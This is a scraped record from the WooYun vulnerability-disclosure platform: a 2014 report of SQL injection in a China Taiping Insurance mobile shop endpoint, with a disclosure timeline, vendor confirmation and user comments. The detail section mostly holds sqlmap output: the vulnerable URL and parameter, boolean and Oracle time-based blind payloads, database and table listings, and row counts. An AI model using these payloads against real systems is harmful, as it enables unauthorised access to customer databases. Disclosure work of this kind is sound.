{"id": 217, "wybug_id": "wooyun-2014-076758", "wybug_title": "太平保险某站点严重SQL注入一枚(一)", "wybug_corp": "cncert国家互联网应急中心", "wybug_author": "爱上平顶山", "wybug_date": "2014-09-20 21:59", "wybug_open_date": "2014-11-04 22:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注射技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-05：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-10-15：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-10-25：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-11-04：\t细节向公众公开  简要描述： 0.0太平保险  很厉害的赶脚啊~ 详细说明：  太平保险中国太平网上商城 点：http://emall.life.cntaiping.com/mobile/download?sAction=loadIos&appType=5  sqlmap identified the following injection points with a total of 66 HTTP(s) requests:---Place: GETParameter: appType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sAction=loadIos&appType=5 AND 2596=2596    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: sAction=loadIos&appType=5 AND 1519=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)---web server operating system: Linux Red Hat Enterprise 5 (Tikanga)web application technology: Servlet 2.5, JSP 2.1, Apache 2.2.3back-end DBMS: Oraclesqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: appType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sAction=loadIos&appType=5 AND 2596=2596    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: sAction=loadIos&appType=5 AND 1519=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)---web server operating system: Linux Red Hat Enterprise 5 (Tikanga)web application technology: Servlet 2.5, JSP 2.1, Apache 2.2.3back-end DBMS: Oracleavailable databases [9]:[*] APEX_030200[*] CTXSYS[*] EXFSYS[*] MDSYS[*] MOBILE_SRV[*] OLAPSYS[*] SYS[*] SYSTEM[*] XDBsqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: appType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sAction=loadIos&appType=5 AND 2596=2596    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: sAction=loadIos&appType=5 AND 1519=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)---web server operating system: Linux Red Hat Enterprise 5 (Tikanga)web application technology: Servlet 2.5, JSP 2.1, Apache 2.2.3back-end DBMS: Oraclecurrent schema (equivalent to database on Oracle):    'MOBILE_SRV'sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: appType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sAction=loadIos&appType=5 AND 2596=2596    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: sAction=loadIos&appType=5 AND 1519=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)---web application technology: Servlet 2.5, JSP 2.1, Apache 2.2.3back-end DBMS: OracleDatabase: MOBILE_SRV[18 tables]+-----------------------------+| EIS_MOBI_APP_CATE           || EIS_MOBI_APP_TYPE           || EIS_MOBI_DEVICE             || EIS_MOBI_DEVICE_TYPE        || EIS_MOBI_DOWNLOAD_INFO      || EIS_MOBI_DOWNLOAD_SOURCE    || EIS_MOBI_OS_TYPE            || EIS_MOBI_PROTOCOL_TYPE      || EIS_MOBI_SESSION_ACCESS_LOG || EIS_MOBI_SESSION_DAY_HIS    || EIS_MOBI_SESSION_DEVICE     || EIS_MOBI_SESSION_INFO       || EIS_MOBI_SESSION_LOG        || EIS_MOBI_SESSION_MODULE     || EIS_MOBI_SESSION_MODULE_URL || EIS_MOBI_SESSION_USER_HIS   || EIS_MOBI_TRANSFER           || EIS_MOBI_VERSION            |+-----------------------------+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:---Place: GETParameter: appType    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: sAction=loadIos&appType=5 AND 2596=2596    Type: AND/OR time-based blind    Title: Oracle AND time-based blind (heavy query)    Payload: sAction=loadIos&appType=5 AND 1519=(SELECT COUNT(*) FROM ALL_USERS T1,ALL_USERS T2,ALL_USERS T3,ALL_USERS T4,ALL_USERS T5)---web server operating system: Linux Red Hat Enterprise 5 (Tikanga)web application technology: Servlet 2.5, JSP 2.1, Apache 2.2.3back-end DBMS: OracleDatabase: MOBILE_SRV+-----------------------------+---------+| Table                       | Entries |+-----------------------------+---------+| EIS_MOBI_SESSION_ACCESS_LOG | 9868713 || EIS_MOBI_SESSION_USER_HIS   | 530929  || EIS_MOBI_SESSION_LOG        | 371003  || EIS_MOBI_SESSION_MODULE     | 369541  || EIS_MOBI_SESSION_MODULE_URL | 368901  || EIS_MOBI_DOWNLOAD_INFO      | 341010  || EIS_MOBI_SESSION_DAY_HIS    | 52628   || EIS_MOBI_SESSION_DEVICE     | 15113   || EIS_MOBI_SESSION_INFO       | 15113   || EIS_MOBI_VERSION            | 186     || EIS_MOBI_TRANSFER           | 65      || EIS_MOBI_APP_TYPE           | 58      || EIS_MOBI_APP_CATE           | 7       || EIS_MOBI_DOWNLOAD_SOURCE    | 5       || EIS_MOBI_DEVICE_TYPE        | 4       || EIS_MOBI_OS_TYPE            | 2       || EIS_MOBI_PROTOCOL_TYPE      | 1       |+-----------------------------+---------+ok  点到为止 不多说   漏洞证明：  如上   修复方案：  过滤~   版权声明：转载请注明来源 爱上平顶山@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2014-09-25 12:38 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-20 22:06 |    \t\tki11y0u \t\t\t( 普通白帽子  |\t\t\t        Rank:104 漏洞数:23        | 好好学习，求带飞~~~~~~~~~~~~~~~~~~~~~~...)\t\t \n  膜拜楼主~    \n     2014-09-20 22:22 |    \t\t丸子响当当 \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:5        | 学习温习•••••••)\t\t \n  膜拜楼主~    \n     2014-09-20 23:53 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  你小子好啊，不打包刷rank，上次银联的给你刷了好几炮！求带刷rank    \n     2014-09-21 10:19 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  @U神 ...不是啊 U神 不是一回事~    \n     2014-09-25 15:32 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  又可以参加众测了，好高兴哟~    \n     2014-09-25 16:47 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2738 漏洞数:547        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  @小胖子  good~    \n     2014-11-05 11:28 |    \t\tWangl \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:4        | 新浪支付，值得拥有)\t\t \n  @char 中国保险哪家强？     \n     2014-11-05 14:06 |    \t\tchar \t\t\t( 路人 |\t\t\t        Rank:13 漏洞数:3        | 中国平安，不只保险这么简单。)\t\t \n  @wangl 别砸场。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}